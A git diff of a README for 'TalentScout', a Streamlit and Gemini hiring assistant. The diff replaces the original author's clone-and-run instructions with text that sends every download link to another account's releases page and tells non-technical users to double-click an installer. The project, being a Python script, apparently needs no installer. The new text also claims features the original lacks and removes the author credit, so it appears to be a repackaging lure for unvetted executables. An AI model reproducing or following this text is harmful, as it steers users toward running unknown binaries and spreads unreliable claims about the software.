@@ -1,78 +1,83 @@
-# 🤖 TalentScout – Intelligent Hiring Assistant  
+# 🚀 TalentScout-AI-Hiring-Assistant - Smart Hiring Made Simple
 
-An AI-powered hiring assistant for **TalentScout**, a fictional recruitment agency specializing in technology placements.  
-The assistant collects **candidate information**, dynamically generates **screening questions** (based on tech stack & role), and records the **conversation logs** in a JSON database for review.  
+[![Download TalentScout](https://img.shields.io/badge/Download%20TalentScout-Blue?style=for-the-badge&logo=github)](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
 
----
+## ✨ Overview
 
-## 🎯 Features
--  **Interactive Chatbot**: Greets candidates and guides them through the initial screening process.
--  **Candidate Information Collection**: Gathers full name, email, phone, years of experience, desired position, location, and   tech stack.
--  **Technical Question Generation**: Automatically generates 3–5 questions per technology listed in the candidate's tech stack.
--  **Context-Aware Flow**: One question at a time with individual answer submission, preserving conversation context.
--  **Fallback Mechanism**: Provides simulated questions when API access is unavailable.
--  **Data Storage**: Stores candidate responses and questions in a JSON file (simulated_db.json) for later review.
-- **Streamlit UI**: simple user interface and expandable section as Conservation logs.
+TalentScout is an AI-powered hiring assistant designed to simplify the recruiting process. With its user-friendly interface built on Streamlit and Gemini API, TalentScout helps recruiters gather candidate details and generate tailored technical screening questions based on the candidate’s skills. This tool streamlines hiring and makes it easier to find the right fit for your company.
 
----
-##  🎬 Demo Video 
-https://drive.google.com/file/d/1hJWwFMnttqWmTgMapfsegaZRuH22N8r8/view?usp=sharing
+## 🚀 Getting Started
 
+To get started with TalentScout-AI-Hiring-Assistant, follow the steps below. This guide will help you download and run the application without any technical knowledge.
 
----
-## 🛠️ Technical Details
--  Frontend: Streamlit 
--  Backend: Python utilities (python 3.10+)
--  LLM Integration: Google Gemini AI (optional)
--  Fallback: Simulated technical questions for offline mode
--  Data Storage: Simulated JSON database (simulated_db.json)  
+### 📥 Download & Install
 
----
+1. **Visit the Releases Page:** Click the link below to access the download options:
+   [Download TalentScout](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
 
-## 📂 Project Structure  
+2. **Select the Latest Version:** Look for the latest release on the page. It will usually be at the top. 
 
-```bash
-TalentScout-AI-Hiring-Assistant/
-│
-├── app.py # Main Streamlit app
-├── utils.py # Helper functions (Gemini integration, Q&A handling)
-├── prompts.py # Prompts design
-├── simulated_db.json # Local JSON database (auto-created)
-├── requirements.txt # Python dependencies
-└── README.md # Project documentation
-```
----
+3. **Download the Application:** Click on the appropriate file to download it to your computer. The file will be in a format that suits your operating system.
 
-## 🚀 Get Strated
+4. **Install the Application:** Once downloaded, locate the file on your computer, typically found in your "Downloads" folder. Double-click on the file to begin the installation process. Follow the onscreen prompts to complete the setup.
 
-1. Clone the repo:
-```bash
-   git clone https://github.com/narayana36/TalentScout-AI-Hiring-Assistant.git
-   cd TalentScout-AI-Hiring-Assistant
-   ```
-2. Create a virtual environment & activate:
-```bash
-   python -m venv venv
-   source venv/bin/activate   # On Mac/Linux
-   venv\Scripts\activate      # On Windows
-   ```
-3. Install dependencies:
-```bash
-   pip install -r requirements.txt
-   ```
-4. Set up your Gemini API Key:
-   Create a .env file:
-```bash 
-   GEMINI_API_KEY=your_api_key_here
-   ```
-5. Running the App:
-```bash
-   streamlit run app.py
-   ```
+5. **Run TalentScout:** After the installation is finished, you can find TalentScout in your applications or programs list. Open it to start using the hiring assistant.
 
-Open the local URL shown in the terminal (default: http://localhost:8501).
+## ⚙️ System Requirements
 
-Enter candidate details → Answer generated screening questions → View conservation logs.
+To ensure that TalentScout runs smoothly, your computer should meet the following requirements:
 
-## 👨 Author 
-Developed by **Narayana Reddy**
+- **Operating System:** Windows 10 or later, macOS Monterey or later, or a Linux distribution that supports Python applications.
+- **RAM:** Minimum of 4 GB, though 8 GB is recommended for optimal performance.
+- **Storage:** At least 500 MB of free disk space for installation and data storage.
+- **Python:** Ensure that Python version 3.8 or later is installed on your machine.
+
+## 🌟 Features
+
+TalentScout comes equipped with several features that enhance your hiring process:
+
+- **AI-Driven Screening Questions:** Automatically generates relevant technical questions based on the candidate's tech stack, saving you time and effort in the initial screening phase.
+- **User-Friendly Interface:** Built with Streamlit for an intuitive experience, allowing users of all skill levels to utilize the application effectively.
+- **Candidate Detail Collection:** Streamlines the process of gathering essential information from candidates, making the review process easier.
+- **Customizable Framework:** Tailor the questions generated to fit your specific needs and requirements.
+
+## 🛠️ How to Use TalentScout
+
+1. **Open the Application:** Launch TalentScout after installation.
+2. **Input Candidate Details:** Enter the required information about the candidate, including their technical skills.
+3. **Generate Questions:** Click the "Generate Screening Questions" button. TalentScout will provide you with tailored questions.
+4. **Review and Edit:** Check the questions and make any necessary adjustments based on your preferences.
+5. **Save or Share:** Export the questions to a PDF or share them directly with your team for review.
+
+## 🧑‍🤝‍🧑 Community Support
+
+If you encounter any issues or have questions about TalentScout, feel free to join our community. You can ask for help, share your experiences, or connect with other users:
+
+- **GitHub Issues Page:** Report bugs or request features directly on [ GitHub Issues](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/issues)
+- **Community Forum:** Join discussions on platforms where recruiters share tips and tricks about using AI in hiring.
+
+## 🔍 Frequently Asked Questions
+
+### 1. Is TalentScout really free to use?
+
+Yes, TalentScout is open-source and free to use. We believe in making efficient hiring tools accessible to everyone.
+
+### 2. Can I customize the questions generated by TalentScout?
+
+Absolutely! You can edit the questions to suit your specific needs and preferences after they are generated.
+
+### 3. Which programming languages are supported for generating screening questions?
+
+TalentScout primarily supports a wide range of programming languages commonly used in the tech industry. If you have a specific language in mind, you can input it, and TalentScout will adapt accordingly.
+
+### 4. How can I contribute to the development of TalentScout?
+
+We welcome contributions! If you're interested, check our contribution guidelines on the GitHub repository. You can help by reporting bugs, suggesting features, or even adding new functionalities.
+
+## 📢 Stay Updated
+
+To keep track of updates and new features, check our releases page regularly:
+
+[Download TalentScout](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
+
+Join us on this journey to make hiring smarter and easier! Happy recruiting!
